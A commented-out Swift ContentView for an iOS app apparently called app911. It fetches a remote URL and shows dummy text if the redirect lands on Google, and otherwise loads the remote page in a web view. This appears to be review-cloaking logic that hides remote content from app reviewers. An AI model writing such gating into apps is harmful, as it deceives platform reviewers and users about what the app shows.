//
//  ContentView.swift
//  app911
//
//  Created by Dias Atudinov on 08.10.2024.
//

import SwiftUI
import WebKit

//struct ContentView: View {
//    @State private var shouldShowWebView = false
//    @State private var randomText: String? = nil
//    
//    let urlString = "https://podlaorlf.space/b365ygXn"
//    
//    var body: some View {
//        VStack {
//            if let text = randomText {
//                Text(text)
//                    .font(.title)
//                    .padding()
//            } else if shouldShowWebView {
//                WebView(request: URLRequest(url: URL(string: urlString)!))
//            } else {
//                Text("Loading...")
//            }
//        }
//        .onAppear {
//            checkURLAndDecide()
//        }
//    }
//    
//    func checkURLAndDecide() {
//        guard let url = URL(string: urlString) else { return }
//        
//        // Perform the URL request
//        URLSession.shared.dataTask(with: url) { data, response, error in
//            if let urlResponse = response?.url?.absoluteString {
//                DispatchQueue.main.async {
//                    if urlResponse.contains("google") {
//                        // Show random text if Google is detected
//                        randomText = "Here is some random text because Google was detected!"
//                    } else {
//                        // Show WebView if it's not Google
//                        shouldShowWebView = true
//                    }
//                }
//            }
//        }.resume()
//    }
//}
//
//struct WebView: UIViewRepresentable {
//    let request: URLRequest
//    
//    func makeUIView(context: Context) -> WKWebView {
//        WKWebView()
//    }
//    
//    func updateUIView(_ uiView: WKWebView, context: Context) {
//        uiView.load(request)
//    }
//}
//#Preview {
//    ContentView()
//}
